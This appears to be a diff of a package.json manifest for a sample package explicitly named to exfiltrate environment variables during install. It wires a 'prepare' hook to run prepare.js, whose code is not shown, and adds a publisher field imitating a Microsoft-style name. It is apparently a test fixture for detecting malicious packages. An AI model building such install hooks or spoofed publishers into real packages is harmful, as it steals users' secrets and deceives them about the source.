@@ -1,6 +1,7 @@
 {
   "name": "exfiltrate-env-vars-during-install",
-  "version": "1.0.0",
+  "version": "1",
+  "publisher": "ms-windows-ai-studio",
   "description": "",
   "scripts": {
     "prepare": "node prepare.js"
